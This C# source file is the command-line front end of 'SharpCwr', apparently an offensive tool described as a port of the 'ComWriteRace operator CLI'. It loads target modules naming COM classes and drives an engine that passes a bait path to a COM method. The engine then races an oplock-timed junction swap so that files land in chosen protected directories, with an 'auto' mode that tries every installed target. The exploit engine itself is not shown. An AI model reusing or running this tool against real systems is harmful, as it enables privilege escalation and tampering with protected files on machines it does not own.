using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace SharpCwr {

public static class Program {
  private static string targetsDirectory = "";
  private static string variantId = "";
  private static string workspace = "";
  private static string targetPath = "";
  private static string payloadPath = "";
  private static string payloadKind = "";
  private static string actionOverride = "";
  private static int attempts = 1;
  private static int oplockTimeoutMs = 5000;
  private static int swapStartOffsetUs;
  private static bool execute = true;
  private static bool verbose;

  public static int Main(string[] args) {
    try {
      string command;
      string targetId;
      ParseArgs(args, out command, out targetId);
      string directory = TargetsDirectory();
      if (command == "targets") return CmdTargets(directory);
      if (command == "auto") return CmdAuto(directory);
      if (command == "info") return CmdInfo(directory, targetId);

      if (command != "check" && command != "write") {
        throw new NotSupportedException(
            "SharpCwr port v1 supports check and write actions; DLL/script " +
            "execution is not implemented. Use the native cwr tool.");
      }
      EnsureSupportedAction(ActionKey());
      var module = FindTarget(directory, targetId);
      if (module.IsUngated == false) {
        string reason = BuildGate.RefusalReason(module, BuildGate.HostBuild());
        if (reason != null) {
          Console.Out.WriteLine("[-] " + reason);
          return 2;
        }
      }
      var plan = Plan.Resolve(module, workspace, targetPath, module.Content, ActionKey() == "check", payloadPath);
      if (verbose) DescribePlan(module, plan);
      var result = Engine.Execute(
          module, plan, execute, attempts, verbose, oplockTimeoutMs,
          payloadPath, swapStartOffsetUs);
      Console.Out.WriteLine((result.Success ? "[+] " : "[-] ") + result.Message);
      if (result.Attempts > 0) {
        Console.Out.WriteLine("[*] Attempts used: " + result.Attempts);
      }
      if (result.Message.StartsWith("client_timeout")) Environment.Exit(2);
      return result.Success ? 0 : 2;
    } catch (Exception error) {
      Console.Error.WriteLine("error: " + error.Message);
      return 1;
    }
  }

  private static void ParseArgs(string[] args, out string command, out string targetId) {
    command = null;
    targetId = null;
    bool commandSeen = false;
    for (int i = 0; i < args.Length; ++i) {
      string a = args[i];
      if (!a.StartsWith("--")) {
        if (!commandSeen) { command = a; commandSeen = true; }
        else if (targetId == null) targetId = a;
        else throw new InvalidOperationException("unexpected argument: " + a);
        continue;
      }
      string flagValue = null;
      string flag = a;
      if (a.IndexOf('=') > 0) {
        int split = a.IndexOf('=');
        flag = a.Substring(0, split);
        flagValue = a.Substring(split + 1);
      }
      if (flag == "-h" || flag == "--help") { Console.Out.Write(HelpText()); Environment.Exit(0); }
      else if (flag == "--targets-dir") targetsDirectory = Take(args, ref i, flagValue, flag);
      else if (flag == "--variant") variantId = Take(args, ref i, flagValue, flag);
      else if (flag == "--action") actionOverride = Take(args, ref i, flagValue, flag);
      else if (flag == "--workspace") workspace = Take(args, ref i, flagValue, flag);
      else if (flag == "--dest") targetPath = Take(args, ref i, flagValue, flag);
      else if (flag == "--file") { payloadPath = Take(args, ref i, flagValue, flag); payloadKind = "file"; }
      else if (flag == "--dll") { payloadPath = Take(args, ref i, flagValue, flag); payloadKind = "dll"; }
      else if (flag == "--script") { payloadPath = Take(args, ref i, flagValue, flag); payloadKind = "script"; }
      else if (flag == "--attempts") attempts = int.Parse(Take(args, ref i, flagValue, flag));
      else if (flag == "--trigger-timeout-ms") oplockTimeoutMs = int.Parse(Take(args, ref i, flagValue, flag));
      else if (flag == "--swap-start-offset-us") swapStartOffsetUs = int.Parse(Take(args, ref i, flagValue, flag));
      else if (flag == "--dry-run") execute = false;
      else if (flag == "--verbose") verbose = true;
      else if (flag == "--host-arch") Take(args, ref i, flagValue, flag);
      else if (flag == "--no-evidence") { }
      else throw new InvalidOperationException("unknown argument: " + a);
    }
    if (command == null) throw new InvalidOperationException("a command is required");
    if (NeedsTarget(command) && targetId == null) {
      throw new InvalidOperationException("this command requires a target id");
    }
  }

  private static bool NeedsTarget(string command) {
    return command == "info" || command == "check" || command == "write" || command == "exec";
  }

  private static string Take(string[] args, ref int i, string inlineValue, string flag) {
    if (inlineValue != null) return inlineValue;
    if (i + 1 >= args.Length) throw new InvalidOperationException(flag + " requires a value");
    return args[++i];
  }

  private static TargetDefinition FindTarget(string directory, string targetId) {
    if (!Directory.Exists(directory)) {
      throw new InvalidOperationException("target module not installed: " + targetId);
    }
    foreach (string path in Directory.GetFiles(directory, "*.cwr")) {
      TargetDefinition module;
      try {
        module = Targets.LoadModuleById(path, targetId, ActionKey(), variantId);
      } catch (InvalidOperationException) {
        throw;
      } catch (Exception) {
        module = null;
      }
      if (module != null) return module;
    }
    throw new InvalidOperationException("target module not installed: " + targetId);
  }

  private static string TargetsDirectory() {
    if (targetsDirectory.Length > 0) return Path.GetFullPath(targetsDirectory);
    return Path.Combine(Path.GetDirectoryName(AssemblyPath()), "targets");
  }

  private static string AssemblyPath() {
    return System.Reflection.Assembly.GetExecutingAssembly().Location;
  }

  private static string ModulePath(string directory, string targetId) {
    string path = Path.Combine(directory, targetId + ".cwr");
    if (!File.Exists(path)) {
      throw new InvalidOperationException("target module not installed: " + targetId);
    }
    return path;
  }

  private static string ActionKey() {
    if (actionOverride.Length > 0) {
      if (actionOverride == "check") return "check";
      if (actionOverride == "write") return "write";
      if (actionOverride == "exec-dll") return "exec_dll";
      if (actionOverride == "exec-script") return "exec_script";
      throw new InvalidOperationException("unknown --action: " + actionOverride);
    }
    if (payloadKind == "dll") return "exec_dll";
    if (payloadKind == "script") return "exec_script";
    if (payloadKind == "file") return "write";
    return "check";
  }

  private static void EnsureSupportedAction(string actionKey) {
    if ((actionKey != "check" && actionKey != "write") ||
        payloadKind == "dll" || payloadKind == "script") {
      throw new NotSupportedException(
          "SharpCwr port v1 supports check and write actions; DLL/script " +
          "execution is not implemented. Use the native cwr tool.");
    }
  }

  private static int CmdTargets(string directory) {
    var modules = ModuleIds(directory);
    if (modules.Count == 0) {
      Console.Out.WriteLine("No target modules installed in " + directory);
      return 0;
    }
    Console.Out.WriteLine("Installed targets (" + modules.Count + ")");
    foreach (string id in modules) {
      Console.Out.WriteLine("  " + id);
    }
    return 0;
  }

  private static List<string> ModuleIds(string directory) {
    if (!Directory.Exists(directory)) return new List<string>();
    return Directory.GetFiles(directory, "*.cwr")
        .Select(Path.GetFileNameWithoutExtension)
        .OrderBy(id => id, StringComparer.Ordinal)
        .ToList();
  }

  private static int CmdInfo(string directory, string targetId) {
    bool found = false;
    if (Directory.Exists(directory)) {
      foreach (string path in Directory.GetFiles(directory, "*.cwr")) {
        if (Targets.ModuleId(path) != targetId) continue;
        found = true;
        foreach (string action in new[] { "check", "write", "exec_dll", "exec_script" }) {
          try {
            Targets.LoadModule(path, action, variantId);
            Console.Out.WriteLine("  " + action + ": yes");
          } catch {
            Console.Out.WriteLine("  " + action + ": no");
          }
        }
      }
    }
    if (!found) {
      throw new InvalidOperationException("target module not installed: " + targetId);
    }
    return 0;
  }

  private static int CmdAuto(string directory) {
    var ids = ModuleIds(directory);
    if (ids.Count == 0) {
      Console.Out.WriteLine("No target modules installed in " + directory);
      return 2;
    }
    string actionKey = ActionKey();
    EnsureSupportedAction(actionKey);
    foreach (string id in ids) {
      Console.Out.WriteLine("[*] Attempting " + actionKey + " via " + id);
      TargetDefinition module;
      try {
        module = Targets.LoadModule(ModulePath(directory, id), actionKey, variantId);
      } catch (InvalidOperationException ex) {
        Console.Out.WriteLine("[-] " + ex.Message);
        continue;
      }
      string reason = BuildGate.RefusalReason(module, BuildGate.HostBuild());
      if (reason != null) {
        if (verbose) Console.Out.WriteLine("[*] " + id + " skipped: " + reason);
        continue;
      }
      ResolvedRun plan;
      try {
        plan = Plan.Resolve(module, workspace, targetPath, module.Content, actionKey == "check", payloadPath);
      } catch (Exception ex) {
        Console.Out.WriteLine("[-] " + ex.Message);
        continue;
      }
      if (verbose) DescribePlan(module, plan);
      var result = Engine.Execute(
          module, plan, execute, attempts, verbose, oplockTimeoutMs,
          payloadPath, swapStartOffsetUs);
      Console.Out.WriteLine((result.Success ? "[+] " : "[-] ") + result.Message);
      if (result.Success) {
        Console.Out.WriteLine("[+] Auto succeeded via " + id + " (" + actionKey + ")");
        return 0;
      }
      if (result.Message.StartsWith("client_timeout")) Environment.Exit(2);
    }
    return 2;
  }

  private static void DescribePlan(TargetDefinition target, ResolvedRun plan) {
    Console.Out.WriteLine("Target action: " + target.Name);
    Console.Out.WriteLine("Invoker: " + target.Invoker);
    Console.Out.WriteLine("CLSID: " + target.Clsid);
    Console.Out.WriteLine("Method: " + target.Method);
    Console.Out.WriteLine("Workspace: " + plan.Workspace);
    Console.Out.WriteLine("Target: " + plan.TargetPath);
    Console.Out.WriteLine("Bait path passed to COM: " + plan.BaitPath);
    Console.Out.WriteLine("Junction swap: " + plan.SafeDirectory + " -> " + plan.TargetDirectory);
    Console.Out.WriteLine("Attempts: " + attempts);
    Console.Out.WriteLine("Execution: " + (execute ? "live" : "dry-run"));
  }

  private static string HelpText() {
    var sb = new StringBuilder();
    sb.AppendLine("SharpCwr - in-memory C# port of the ComWriteRace operator CLI.");
    sb.AppendLine("Usage: SharpCwr <auto|targets|info|check> [options]");
    sb.AppendLine("Options: --targets-dir --variant --action --workspace --dest");
    sb.AppendLine("         --attempts --trigger-timeout-ms --swap-start-offset-us");
    sb.AppendLine("         --dry-run --verbose");
    sb.AppendLine("Payload placement and exec actions require the native cwr tool.");
    return sb.ToString();
  }
}

}
